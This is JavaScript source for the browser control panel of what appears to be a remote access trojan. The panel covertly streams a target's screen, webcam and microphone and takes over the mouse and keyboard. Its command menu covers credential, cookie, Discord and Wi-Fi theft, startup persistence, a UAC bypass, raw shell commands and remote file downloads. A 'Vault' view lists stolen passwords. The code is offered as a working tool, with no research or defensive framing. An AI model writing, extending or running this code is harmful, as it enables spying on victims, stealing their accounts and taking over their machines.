// â”€â”€ LIVE GRAPHS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// DPR-aware, resize-safe sparkline renderer
const _graphCtx = {};

function initGraphs() {
	_resizeGraph("graphLoad");
	_resizeGraph("graphConn");
	window.addEventListener("resize", () => {
		_resizeGraph("graphLoad");
		_resizeGraph("graphConn");
		drawGraphs();
	});
	drawGraphs();
}

function _resizeGraph(id) {
	const c = $(id);
	if (!c) return;
	const dpr = window.devicePixelRatio || 1;
	const rect = c.parentElement?.getBoundingClientRect() || { width: 200, height: 60 };
	const w = Math.max(rect.width || 200, 40);
	const h = 60;
	c.width  = Math.round(w * dpr);
	c.height = Math.round(h * dpr);
	c.style.width  = w + "px";
	c.style.height = h + "px";
	const ctx = c.getContext("2d");
	ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
	_graphCtx[id] = { ctx, w, h };
}

function pushGraph(name, val) {
	graphs[name].push(val);
	if (graphs[name].length > MAX_PTS) graphs[name].shift();
	drawGraphs();
}

function drawGraph(id, data, color, fillColor) {
	const g = _graphCtx[id];
	if (!g) { _resizeGraph(id); return; }
	const { ctx, w, h } = g;
	ctx.clearRect(0, 0, w, h);
	if (data.length < 2) return;

	const max = Math.max(...data, 1);
	const step = w / (MAX_PTS - 1);
	const pad  = 6;

	const pts = data.map((v, i) => ({
		x: w - (data.length - 1 - i) * step,
		y: h - pad - (v / max) * (h - pad * 2),
	}));

	// Filled area
	ctx.beginPath();
	ctx.moveTo(pts[0].x, h);
	ctx.lineTo(pts[0].x, pts[0].y);
	for (let i = 1; i < pts.length; i++) {
		const mx = (pts[i - 1].x + pts[i].x) / 2;
		ctx.bezierCurveTo(mx, pts[i - 1].y, mx, pts[i].y, pts[i].x, pts[i].y);
	}
	ctx.lineTo(pts[pts.length - 1].x, h);
	ctx.closePath();
	const grad = ctx.createLinearGradient(0, 0, 0, h);
	grad.addColorStop(0, fillColor);
	grad.addColorStop(1, "rgba(0,0,0,0)");
	ctx.fillStyle = grad;
	ctx.fill();

	// Line
	ctx.beginPath();
	ctx.moveTo(pts[0].x, pts[0].y);
	for (let i = 1; i < pts.length; i++) {
		const mx = (pts[i - 1].x + pts[i].x) / 2;
		ctx.bezierCurveTo(mx, pts[i - 1].y, mx, pts[i].y, pts[i].x, pts[i].y);
	}
	ctx.strokeStyle = color;
	ctx.lineWidth   = 1.75;
	ctx.lineJoin    = "round";
	ctx.lineCap     = "round";
	ctx.stroke();

	// Dot at the latest point
	const last = pts[pts.length - 1];
	ctx.beginPath();
	ctx.arc(last.x, last.y, 2.5, 0, Math.PI * 2);
	ctx.fillStyle = color;
	ctx.fill();
}

function drawGraphs() {
	drawGraph("graphLoad", graphs.load, "#4f8cff", "rgba(79,140,255,0.18)");
	drawGraph("graphConn", graphs.conn, "#9f7aea", "rgba(159,122,234,0.18)");
}


// â”€â”€ REMOTE DESKTOP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function openRemote(id, node) {
	currentTargetId = id;
	_fsNodeId = id;
	$("remoteModal").style.display = "block";
	$("remoteNodeLabel").textContent = id;

	// Hide main UI elements to prevent overlap and increase immersion
	const topBar = document.querySelector(".top-bar");
	const sidebar = document.querySelector(".sidebar");
	const mainArea = document.querySelector(".main-area");
	if (topBar) topBar.style.display = "none";
	if (sidebar) sidebar.style.display = "none";
	if (mainArea) mainArea.style.marginLeft = "0";
	if (mainArea) mainArea.style.padding = "0";

	// Update selectors based on specs
	const s = node?.specs || node || {};
	const monSel = $("monitorSelector");
	if (monSel && s.monitors > 1) {
		monSel.style.display = "flex";
		let html = '<option value="-1">All Screens</option>';
		for (let i = 0; i < s.monitors; i++)
			html += `<option value="${i}">Screen ${i + 1}</option>`;
		$("monSelect").innerHTML = html;
		$("monSelect").value = "0";
	} else if (monSel) {
		monSel.style.display = "none";
	}

	const camSel = $("cameraSelector");
	if (camSel) {
		camSel.style.display = "flex";
		let html = `<option value="-1">Cam OFF</option>`;
		const camCount = Math.max(s.cameras || 0, 1); // always show at least 1
		const names = s.camera_names || [];
		for (let i = 0; i < camCount; i++)
			html += `<option value="${i}">${names[i] || `Camera ${i + 1}`}</option>`;
		$("camSelect").innerHTML = html;
		$("camSelect").value = "-1";
	}
	const displayId = s.hostname || id;
	$("remoteSideTitle").textContent = displayId;
	$("remoteSideNodeId").textContent = "";
	$("shellOutput").textContent = "";
	renderRemoteSpecs(s);
	$("noStreamMsg").style.display = "";
	_streaming = true;
	frameCount = 0;
	lastFpsTime = performance.now();
	if (socket?.readyState === WebSocket.OPEN) {
		socket.send(JSON.stringify({ type: "select_device", id }));
		socket.send(
			JSON.stringify({ type: "stream", cmd: "start", id: currentTargetId }),
		);
	}
	// â”€â”€ Bind HID listeners to the actual canvas (must happen after remote opens) â”€â”€
	const _cv = $("desktopView");
	if (_cv && !_cv._hidBound) {
		_cv._hidBound = true;
	}
	document.addEventListener("keydown", handleKeyDown);
	document.addEventListener("keyup",   handleKeyUp);
	// Reset FPS selector to 30 for each new session
	const fpsSel = $("fpsSelect");
	if (fpsSel) {
		fpsSel.value = "20";
	}
	if (socket?.readyState === WebSocket.OPEN)
		socket.send(JSON.stringify({ type: "set_fps", fps: 20, id }));
	// Populate HUD monitor picker
	const hudMonSel = $("hudMonSelect"),
		hudMonChip = $("monPickerChip");
	if (hudMonSel && hudMonChip) {
		const monCount = s.monitors || 1;
		let html = "";
		for (let i = 0; i < monCount; i++)
			html += `<option value="${i}">Screen ${i + 1}</option>`;
		hudMonSel.innerHTML = html;
		hudMonSel.value = "0";
		hudMonChip.style.display = monCount > 1 ? "flex" : "none";
	}

	if (!_rafRunning) {
		_rafRunning = true;
		requestAnimationFrame(_flushCanvases);
	}

	// Auto-start WebRTC for lowest possible latency
	if (typeof startWebRTC === "function") {
		startWebRTC();
	}

	// Default to 'tools' -> 'troll' as requested
	setRemoteTab("tools");
	showToolCat("troll");

	// Auto-check persistence status
	if (socket?.readyState === WebSocket.OPEN) {
		socket.send(
			JSON.stringify({ type: "check_persistence", id: currentTargetId }),
		);
	}

	// â”€â”€ Live node stats polling every 5s â”€â”€
	clearInterval(window._statsPoller);
	window._statsPoller = setInterval(() => {
		if (socket?.readyState === WebSocket.OPEN && currentTargetId) {
			socket.send(JSON.stringify({ type: "node_stats", id: currentTargetId }));
		}
	}, 5000);
	// Immediate first fetch
	if (socket?.readyState === WebSocket.OPEN) {
		socket.send(JSON.stringify({ type: "node_stats", id: currentTargetId }));
	}
	// â”€â”€ Start session timer â”€â”€
	_startSessionTimer();
}

function renderRemoteSpecs(s) {
	const panel = $("remoteSpecsPanel");
	if (!panel) return;
	const flag = s.flag || "";
	panel.innerHTML = `
<div class="tool-cat-title" style="margin-bottom:.75rem">Node Intelligence</div>
<div style="display:flex;flex-direction:column;gap:.4rem;background:rgba(255,255,255,0.02);padding:1rem;border-radius:14px;border:1px solid rgba(255,255,255,0.05);box-shadow:inset 0 1px 1px rgba(255,255,255,0.05)">
    ${specLine("ðŸ–¥", "OS", s.os)}
    ${specLine("ðŸ§ ", "CPU", s.cpu)}
    ${specLine("ðŸŽ®", "GPU", s.gpu)}
    ${specLine("ðŸ’¾", "RAM", s.ram)}
    ${specLine("ðŸŒ", "Public", s.public_ip || s.ipv4 || "Unknown", "accent")}
    ${specLine("ðŸ ", "Local", s.local_ip || "â€”")}
    ${specLine("ðŸŒ", "IPv6", s.ipv6)}
    ${specLine("ðŸ’¿", "Disks", s.disks)}
    ${specLine("ðŸ›¡", "VM", s.vm || "Unknown", s.vm === "Detected" ? "red" : "")}
    ${s.monitors !== undefined ? specLine("ðŸ–¥", "Screens", s.monitors) : ""}
    ${s.cameras !== undefined ? specLine("ðŸ“·", "Cameras", s.cameras) : ""}
    ${flag ? specLine("ðŸ“", "Region", `${flag} ${s.region || s.country || ""}`) : ""}
    <div style="margin-top:.5rem;padding-top:.5rem;border-top:1px solid rgba(255,255,255,0.05);display:flex;align-items:center;gap:.4rem;font-size:.72rem">
        <div style="width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green)"></div>
        <span style="color:var(--green);font-weight:800;letter-spacing:0.05em;text-transform:uppercase">Connected</span>
    </div>
</div>`;
}

function specLine(ico, label, val, cls = "") {
	if (!val || val === "â€”") return "";
	let color = "var(--text-2)";
	let shadow = "none";
	if (cls === "accent") {
		color = "var(--accent)";
		shadow = "0 0 10px var(--accent-glow)";
	}
	if (cls === "red") {
		color = "var(--red)";
		shadow = "0 0 10px rgba(255,42,95,0.4)";
	}
	return `<div style="display:flex;align-items:baseline;justify-content:space-between;gap:.375rem">
        <div style="display:flex;align-items:center;gap:0.4rem">
            <span style="font-size:.75rem;opacity:0.8">${ico}</span>
            <span style="font-size:.6rem;font-weight:800;letter-spacing:.08em;text-transform:uppercase;color:var(--text-3)">${label}</span>
        </div>
        <span style="font-size:.75rem;font-weight:600;font-family:'JetBrains Mono',monospace;color:${color};text-shadow:${shadow};overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:180px;text-align:right" title="${val}">${val}</span>
    </div>`;
}

function _togglePanel() {
	const sidebar = document.querySelector(".remote-sidebar");
	const area = $("remoteScreenArea");
	if (!sidebar) return;
	
	sidebar.classList.toggle("hidden");
	const isOpen = !sidebar.classList.contains("hidden");
	
	if (area) {
		area.classList.toggle("panel-open", isOpen);
	}

	// Keep toolbar button in sync
	const btn = $("btnPanelToggle");
	if (btn) btn.classList.toggle("active", isOpen);
}

function _closeRemote() {
	$("remoteModal").style.display = "none";
	$("desktopView").style.display = "none";
	if ($("camContainer")) {
		$("camContainer").style.display = "none";
	}
	const cv = $("camView");
	if (cv && _canvasCtx.camView) {
		_canvasCtx.camView.clearRect(0, 0, cv.width, cv.height);
	}
	delete _pendingBitmap.camView;
	delete _canvasCtx.camView;
	$("noStreamMsg").style.display = "";
	// Restore scan animation for next open
	document.querySelectorAll(".scanline, .scanning-line").forEach(el => el.style.display = "");
	const _sidebar = document.querySelector(".remote-sidebar");
	if (_sidebar) _sidebar.classList.remove("hidden");
	if (socket?.readyState === WebSocket.OPEN) {
		socket.send(
			JSON.stringify({ type: "stream", cmd: "stop", id: currentTargetId }),
		);
		socket.send(
			JSON.stringify({
				type: "stream",
				cmd: "camera",
				active: false,
				idx: 0,
				id: currentTargetId,
			}),
		);
	}
	currentTargetId = null;
	_streaming = false;

	// Restore main UI
	const topBar = document.querySelector(".top-bar");
	const sidebar = document.querySelector(".sidebar");
	const mainArea = document.querySelector(".main-area");
	if (topBar) topBar.style.display = "flex";
	if (sidebar) sidebar.style.display = "flex";
	if (mainArea) mainArea.style.marginLeft = "var(--sidebar-w)";
	if (mainArea) mainArea.style.padding = "2.5rem 3.5rem";

	document.removeEventListener("keydown", handleKeyDown);
	document.removeEventListener("keyup", handleKeyUp);
	if (hidMode === "control") toggleHidMode();
	// â”€â”€ Stop WebRTC if active â”€â”€
	if (typeof _rtcActive !== "undefined" && _rtcActive) stopWebRTC();
	// â”€â”€ Stop stats polling â”€â”€
	clearInterval(window._statsPoller);
	// â”€â”€ Stop session timer â”€â”€
	_stopSessionTimer();
	// â”€â”€ Reset stat badges â”€â”€
	["statNodeCpu","statNodeRam","statNodeWin"].forEach(id => { const el=$(id); if(el) el.textContent="â€”"; });
	// â”€â”€ Reset audio state for next session â”€â”€
	_micOn = false;
	_deskOn = false;
	_setAudioBtn("btnAudioMic", false);
	_setAudioBtn("btnAudioDesk", false);
	const chip = $("audioChip");
	if (chip) chip.style.display = "none";

	for (const k in _audioCtxs) {
		try {
			_audioCtxs[k].close();
		} catch (_e) {}
		delete _audioCtxs[k];
		delete _audioNext[k];
	}
	_audioTabScanned = false;
	if (document.fullscreenElement) document.exitFullscreen();
}

function _toggleFullscreen() {
	const el = $("remoteScreenArea");
	if (!document.fullscreenElement) {
		el.requestFullscreen()
			.then(() => {
				if (navigator.keyboard?.lock) navigator.keyboard.lock();
			})
			.catch(() => {});
	} else {
		if (navigator.keyboard?.unlock) navigator.keyboard.unlock();
		document.exitFullscreen();
	}
}
function popoutRemote() {
	if (!currentTargetId) return;
	const url = `/popout?id=${currentTargetId}`;
	window.open(url, "_blank", "width=1280,height=720,menubar=no,toolbar=no,location=no,status=no,scrollbars=no");
}

function toggleHidMode() {
	hidMode = hidMode === "observe" ? "control" : "observe";
	const btn = $("btnMode"),
		badge = $("remoteModeBadge");
	const isCtrl = hidMode === "control";
	btn.style.color = isCtrl ? "var(--teal)" : "";
	btn.innerHTML = isCtrl
		? '<svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="var(--teal)" stroke-width="2"><title>Icon</title><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg> Command Mode'
		: '<svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><title>Icon</title><circle cx="12" cy="12" r="3"/><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/></svg> Watch Only';
	if (badge)
		badge.querySelector(".hud-value").textContent = isCtrl
			? "COMMAND MODE"
			: "WATCH ONLY";
			
	if (isCtrl && socket && currentTargetId) {
		socket.send(JSON.stringify({ type: "hid_reset", id: currentTargetId }));
	}
	// Crosshair cursor in control mode
	const cv = $("desktopView");
	if (cv) cv.style.cursor = isCtrl ? "crosshair" : "default";`n`tdocument.body.classList.toggle("control-mode", isCtrl);
	// Auto-hide HUD & toolbar in command mode for unobstructed view
	const hud = document.querySelector(".remote-hud");
	const toolbar = document.querySelector(".remote-toolbar");
	if (hud) hud.style.opacity = isCtrl ? "0.4" : "1"; // Keep subtle in control mode
	if (toolbar) toolbar.style.opacity = isCtrl ? "0.15" : "1";
	if (hud) hud.style.transition = "opacity .3s, transform .3s";
	if (toolbar) toolbar.style.transition = "opacity .3s, transform .3s";
	// Hover to reveal toolbar in command mode
	if (toolbar) {
		toolbar.onmouseenter = isCtrl
			? () => {
					toolbar.style.opacity = "1";
				}
			: null;
		toolbar.onmouseleave = isCtrl
			? () => {
					toolbar.style.opacity = "0.15";
				}
			: null;
	}
}

// â”€â”€ Panel collapse/expand (slides UP) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
let _panelCollapsed = false;
function togglePanelCollapse() {
	_panelCollapsed = !_panelCollapsed;
	const header = $("remoteHeader");
	const hud = document.querySelector(".remote-hud");
	const tab = $("remoteHeaderTab");
	const collapseBtn = document.querySelector(
		'[onclick="togglePanelCollapse()"] span',
	);

	if (_panelCollapsed) {
		// Slide both off screen
		if (header) header.style.transform = "translateY(-110%)";
		if (hud) hud.style.transform = "translateX(-50%) translateY(150%)";
		if (tab) tab.style.display = "flex";
		if (collapseBtn) collapseBtn.innerHTML = "&#x25BC;"; // Down arrow
	} else {
		if (header) header.style.transform = "";
		if (hud) hud.style.transform = "translateX(-50%)";
		if (tab) tab.style.display = "none";
		if (collapseBtn) collapseBtn.innerHTML = "&#x25B2;"; // Up arrow
	}
}

function switchMonitor(idx) {
	if (!socket || !currentTargetId) return;
	socket.send(
		JSON.stringify({
			type: "stream",
			cmd: "switch_monitor",
			idx: parseInt(idx, 10),
			id: currentTargetId,
		}),
	);
}

function switchCamera(idx) {
	if (!socket || !currentTargetId) return;
	const v = parseInt(idx, 10);
	if (v === -1) {
		// Turn camera OFF
		socket.send(
			JSON.stringify({
				type: "stream",
				cmd: "camera",
				active: false,
				id: currentTargetId,
			}),
		);
		const cc = $("camContainer");
		if (cc) cc.style.display = "none";
		// Clear canvas
		const cv = $("camView");
		if (cv && _canvasCtx.camView) {
			_canvasCtx.camView.clearRect(0, 0, cv.width, cv.height);
		}
	} else {
		// Turn camera ON at index v
		socket.send(
			JSON.stringify({
				type: "stream",
				cmd: "camera",
				active: true,
				idx: v,
				id: currentTargetId,
			}),
		);
		const cc = $("camContainer");
		if (cc) cc.style.display = "block"; // â† THIS was missing
	}
}
function _setStreamFps(fps) {
	if (!socket || !currentTargetId) return;
	socket.send(
		JSON.stringify({
			type: "set_fps",
			fps: parseInt(fps, 10),
			id: currentTargetId,
		}),
	);
	logEvent(`Stream FPS â†’ ${fps}`, "ok");
}
// â”€â”€ HID: direct command format to match agent's priority queue â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
let _lastMouseX = -1,
	_lastMouseY = -1;
window.sendMouseEvent = function(e, type) {
	if (!socket || !currentTargetId) return;
	
	// Total capture: prevent website interaction
	e.preventDefault();

	if (hidMode !== "control") return;
	
	const container = $("remoteScreenArea");
	const canvas = $("desktopView");
	if (!container || !canvas) return;

	if (type === "mousedown") container.focus();

	const r = container.getBoundingClientRect();
	if (r.width < 10 || r.height < 10) return;

	const srcW = canvas.width || 1920;
	const srcH = canvas.height || 1080;
	const ratio = Math.min(r.width / srcW, r.height / srcH) || 1;
	
	const rendW = srcW * ratio;
	const rendH = srcH * ratio;
	
	const offsetX = (r.width - rendW) / 2;
	const offsetY = (r.height - rendH) / 2;

	let x = (e.clientX - r.left - offsetX) / rendW;
	let y = (e.clientY - r.top - offsetY) / rendH;
	
	x = Math.max(0, Math.min(1, x));
	y = Math.max(0, Math.min(1, y));
	
	if (Number.isNaN(x) || Number.isNaN(y)) return;

	if (type === "mousemove") {
		if (Math.abs(x - _lastMouseX) < 0.0003 && Math.abs(y - _lastMouseY) < 0.0003) return;
		_lastMouseX = x;
		_lastMouseY = y;
		socket.send(JSON.stringify({ type: "mm", x, y, id: currentTargetId }));
	} else {
		const btn = e.button; // 0=left, 1=middle, 2=right
		const press = (type === "mousedown") ? 1 : 0;
		socket.send(JSON.stringify({ type: "mc", x, y, b: btn, p: press, id: currentTargetId }));
	}
}

function _showClickRipple(x, y, color = "rgba(0, 240, 255, 0.4)") {
	const ripple = document.createElement("div");
	ripple.style.cssText = `
		position: fixed;
		left: ${x}px;
		top: ${y}px;
		width: 20px;
		height: 20px;
		background: ${color};
		border: 1px solid var(--accent);
		border-radius: 50%;
		pointer-events: none;
		z-index: 30000;
		transform: translate(-50%, -50%) scale(0);
		transition: transform 0.4s ease-out, opacity 0.4s ease-out;
	`;
	document.body.appendChild(ripple);
	requestAnimationFrame(() => {
		ripple.style.transform = "translate(-50%, -50%) scale(2)";
		ripple.style.opacity = "0";
	});
	setTimeout(() => ripple.remove(), 400);
}

window.sendWheelEvent = function(e) {
	if (hidMode !== "control" || !socket || !currentTargetId) return;
	e.preventDefault();
	socket.send(
		JSON.stringify({ type: "scroll", delta: e.deltaY, id: currentTargetId }),
	);
}

function handleRemoteKey(e, isDown = true) {
	if (hidMode !== "control" || !socket || !currentTargetId) return;
	e.preventDefault();
	socket.send(
		JSON.stringify({
			type: "kd",
			key: e.key,
			code: e.code,
			down: isDown,
			id: currentTargetId,
		}),
	);
}
const handleKeyDown = (e) => handleRemoteKey(e, true);
const handleKeyUp = (e) => handleRemoteKey(e, false);

// â”€â”€ ZERO-COPY CANVAS RENDERER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Uses createImageBitmap (zero-copy GPU path) + canvas drawImage.
// No Blob URL allocation, no GC pauses, no layout thrash.
// Result: same latency as AnyDesk/RustDesk in browser.
const _canvasCtx = {}; // canvas 2D context cache
const _pendingBitmap = {}; // latest decoded bitmap per channel
let _rafRunning = false; // single RAF loop for all channels

// MRL WARE fix: Resume all AudioContexts on first user gesture (browser autoplay policy)
document.addEventListener('click', function _unlockAudio() {
    for (const k in _audioCtxs) {
        if (_audioCtxs[k] && _audioCtxs[k].state === 'suspended') {
            _audioCtxs[k].resume();
        }
    }
}, { once: false });
function handleBinary(buf) {
	const view = new Uint8Array(buf);
	if (view.length < 2) return;
	const tag = view[0];
	// Optimization: Create a view instead of slice to avoid data copy
	const data = new Uint8Array(buf, 1);

	if (tag === 0x03) {
		// Latency measurement: time from receive to canvas draw
		const recvTs = performance.now();
		renderToCanvas(data, "desktopView", true, recvTs);
	} else if (tag === 0x04) {
		renderToCanvas(data, "camView", false, 0);
	} else if (tag === 0x05) {
		handleAudio(data, "mic"); // mic stream
	} else if (tag === 0x06) {
		handleAudio(data, "desktop"); // desktop loopback stream
	}
}

function renderToCanvas(jpegBuf, canvasId, isDesktop, recvTs) {
	// FPS counter
	frameCount++;
	const now = performance.now();
	if (now - lastFpsTime >= 1000) {
		if ($("remoteFps")) $("remoteFps").textContent = frameCount;
		frameCount = 0;
		lastFpsTime = now;
	}
	// Latency meter: ms from binary receive to bitmap ready
	const t0 = recvTs || now;
	// Decode JPEG -> ImageBitmap off main thread (zero copy)
	createImageBitmap(new Blob([jpegBuf], { type: "image/jpeg" }))
		.then((bmp) => {
			// Drop the previous pending frame (we only show latest)
			const old = _pendingBitmap[canvasId];
			if (old) old.close();
			_pendingBitmap[canvasId] = bmp;

			// Show canvas on first frame
			const canvas = $(canvasId);
			if (canvas) {
				// Always ensure canvas is visible
				if (canvas.style.display === "none") canvas.style.display = "block";
				// For camera: show the container too
				if (canvasId === "camView") {
					const cc = $("camContainer");
					if (cc && cc.style.display === "none") cc.style.display = "block";
				}
				if (isDesktop) {
					const msg = $("noStreamMsg");
					if (msg) msg.style.display = "none";
					// Hide all scanning/overlay effects once stream is live
					document.querySelectorAll(".scanline, .scanning-line").forEach(el => el.style.display = "none");
				}
			}

			// Latency display: update 'Ping' chip with frame delivery ms
			if (isDesktop) {
				const latMs = Math.round(performance.now() - t0);
				const latEl = $("remoteLatency");
				if (latEl) {
					latEl.textContent = `${latMs}ms`;
					latEl.style.color =
						latMs < 50
							? "var(--teal)"
							: latMs < 150
								? "var(--amber)"
								: "var(--red)";
				}
			}

			// Start the RAF loop if not already running
			if (!_rafRunning) {
				_rafRunning = true;
				requestAnimationFrame(_flushCanvases);
			}
		})
		.catch(() => {}); // ignore decode errors on partial frames
}

function _flushCanvases() {
	for (const canvasId in _pendingBitmap) {
		const bmp = _pendingBitmap[canvasId];
		if (!bmp) continue;

		const canvas = $(canvasId);
		if (!canvas) {
			bmp.close();
			_pendingBitmap[canvasId] = null;
			continue;
		}

		if (canvas.width !== bmp.width) canvas.width = bmp.width;
		if (canvas.height !== bmp.height) canvas.height = bmp.height;

		if (!_canvasCtx[canvasId]) {
			_canvasCtx[canvasId] = canvas.getContext("2d", {
				alpha: false,
				desynchronized: true,
			});
		}
		_canvasCtx[canvasId].drawImage(bmp, 0, 0);
		bmp.close();
		_pendingBitmap[canvasId] = null;
	}
	// Always keep RAF running â€” eliminates 1-frame startup delay on each new frame
	requestAnimationFrame(_flushCanvases);
}

// Legacy wrapper (no longer used but kept for safety)
function _processApexQueue() {}
function _renderLiveFrame() {}

function sendTroll(action, val = "") {
	if (!currentTargetId || !socket) return;
	socket.send(
		JSON.stringify({
			type: "troll",
			cmd: action,
			val: val,
			id: currentTargetId,
		}),
	);
	logEvent(`ðŸŽ­ Troll: ${action}`, "warn");
}
function sendTrollExt(action, extra = {}) {
	if (!currentTargetId || !socket) return;
	socket.send(
		JSON.stringify({
			type: "troll_ext",
			action,
			id: currentTargetId,
			...extra,
		}),
	);
	logEvent(`ðŸŽ­ Ext Troll: ${action}`, "warn");
}
function _promptTroll(action) {
	const v = prompt(`Enter input for ${action}:`, "");
	if (v !== null) sendTroll(action, v.trim());
}
function _execGlobalCmd() {
	const input = document.getElementById("globalCmdBar");
	const raw = input?.value?.trim();
	if (!raw || !currentTargetId || !socket) return;
	input.value = "";

	const parts = raw.split(" ");
	const cmd = parts[0].toLowerCase();
	const arg = parts.slice(1).join(" ");

	// Command Router
	switch (cmd) {
		case "help":
			showToolResult(
				"Apex Command Help",
				"Available: help, kill [pid], ls [path], ps, net_scan, uac, cams, snap [id], steal, discord, cookie, reg_read [path], audit, persist, whoami, drives, recycle",
			);
			break;
		case "cams":
			sendCmd("get_cameras", {});
			break;
		case "wifi":
			sendCmd("wifi_steal", {});
			break;
		case "audit":
			sendCmd("get_system_info", {});
			break;
		case "persist":
			sendCmd("startup_persist", {});
			break;
		case "kill":
			if (arg) killProcess(parseInt(arg, 10));
			else logEvent("kill requires PID", "err");
			break;
		case "ls":
			browseDir(arg || "C:\\");
			break;
		case "ps":
			listProcesses();
			break;
		case "net_scan":
			_runNetScan();
			break;
		case "uac":
			_runUacBypass();
			break;
		case "webcam":
		case "snap":
			sendCmd("webcam_snap", { idx: arg ? parseInt(arg, 10) : 0 });
			break;
		case "steal":
			sendCmd("steal_creds", {});
			break;
		case "discord":
			sendCmd("discord_steal", {});
			break;
		case "cookie":
			sendCmd("cookie_steal", {});
			break;
		case "whoami":
			sendCmd("whoami", {});
			break;
		case "drives":
			sendCmd("drives", {});
			break;
		case "recycle":
			sendCmd("recycle_bin", {});
			break;
		case "reg_read":
			if (arg) sendCmd("reg_read", { path: arg });
			else logEvent("reg_read requires path", "err");
			break;
		default:
			// Fallback: send as raw shell command
			socket.send(
				JSON.stringify({
					type: "shell",
					c: raw,
					cmd: raw,
					id: currentTargetId,
				}),
			);
			logEvent(`âž¤ Shell: ${raw}`, "info");
	}
}

function sendCmd(type, extra = {}) {
	if (!currentTargetId || !socket) return;
	socket.send(JSON.stringify({ type, id: currentTargetId, ...extra }));
	logEvent(`âž¤ ${type}`, "info");
}
function sendNetCmd(cmd, host = "") {
	if (!currentTargetId || !socket) return;
	socket.send(
		JSON.stringify({ type: "network_cmd", cmd, host, id: currentTargetId }),
	);
	logEvent(`ðŸŒ ${cmd} ${host}`, "info");
}
function _promptNetCmd(cmd) {
	const h = prompt(`Host for ${cmd}:`, "8.8.8.8");
	if (!h) return;
	sendNetCmd(cmd, h.trim());
}
function _promptCmd(type, label, key, def = "") {
	const v = prompt(label, String(def));
	if (v === null) return;
	sendCmd(type, { [key]: Number.isNaN(v) ? v.trim() : Number(v) });
}
function _promptBrowse() {
	const p = prompt("Directory path:", "C:\\Users");
	if (p) browseDir(p.trim());
}
function _promptDownloadUrl() {
	const url = prompt("URL to download:", "");
	if (!url) return;
	const dest =
		prompt("Destination on target (leave blank for temp):", "") || "";
	sendCmd("download_url", { url: url.trim(), dest: dest.trim() });
}

// ==========================================
// THE VAULT (Global Exfiltration DB)
// ==========================================
let _globalVaultData = [];

async function fetchVaultData() {
	$("globalVaultBody").innerHTML = '<tr><td colspan="5" style="text-align:center;padding:4rem;color:var(--text-3)">Loading Vault Intelligence...</td></tr>';
	try {
		const res = await fetch("/api/vault");
		if(!res.ok) throw new Error("Failed to fetch vault data");
		const data = await res.json();
		_globalVaultData = data.vault || [];
		renderVaultData(_globalVaultData);
	} catch(e) {
		console.error("Vault fetch error", e);
		$("globalVaultBody").innerHTML = '<tr><td colspan="5" style="text-align:center;padding:4rem;color:var(--red)">Error loading Vault data. Are you authorized?</td></tr>';
	}
}

function renderVaultData(dataArray) {
	if(dataArray.length === 0) {
		$("globalVaultBody").innerHTML = '<tr><td colspan="5" style="text-align:center;padding:4rem;color:var(--text-3)">No data found in The Vault.</td></tr>';
		return;
	}
	let html = "";
	dataArray.forEach(item => {
		const d = new Date(item.ts * 1000).toLocaleString();
		
		let site = "Unknown";
		let identity = "";
		let val = "";
		
		if(item.type === "credentials" && Array.isArray(item.data)) {
			// Stealer dump contains an array of creds, usually we just show summary if it's a batch, or expand.
			// The backend actually stores the raw list. Let's just flatten it for the table.
			item.data.forEach(cred => {
				const _d = new Date(item.ts * 1000).toLocaleString();
				html += `
					<tr style="border-bottom:1px solid rgba(255,255,255,0.05)">
						<td style="padding:.75rem;color:var(--teal)">${item.device_id.substring(0,8)}...</td>
						<td style="padding:.75rem">Credentials (${cred.browser})</td>
						<td style="padding:.75rem;color:var(--text-2)">${cred.url || '-'}</td>
						<td style="padding:.75rem">
							<div><span style="color:var(--text-3)">U:</span> ${cred.user || '-'}</div>
							<div><span style="color:var(--text-3)">P:</span> <span style="color:var(--amber)">${cred.pass || '-'}</span></div>
						</td>
						<td style="padding:.75rem;color:var(--text-3)">${_d}</td>
					</tr>
				`;
			});
			return; // handled
		} else if(item.type === "cookies") {
			site = "Cookie Dump";
			identity = `${item.data.length} cookies extracted`;
		} else {
			identity = JSON.stringify(item.data).substring(0, 100);
		}
		
		html += `
			<tr style="border-bottom:1px solid rgba(255,255,255,0.05)">
				<td style="padding:.75rem;color:var(--teal)">${item.device_id.substring(0,8)}...</td>
				<td style="padding:.75rem">${item.type}</td>
				<td style="padding:.75rem;color:var(--text-2)">${site}</td>
				<td style="padding:.75rem;color:var(--amber)">${identity}</td>
				<td style="padding:.75rem;color:var(--text-3)">${d}</td>
			</tr>
		`;
	});
	$("globalVaultBody").innerHTML = html;
}

function filterGlobalVault(query) {
	if(!query) return renderVaultData(_globalVaultData);
	const q = query.toLowerCase();
	
	// Complex filtering because of the flattened credential array structure
	let filtered = [];
	_globalVaultData.forEach(item => {
		if(item.type === "credentials" && Array.isArray(item.data)) {
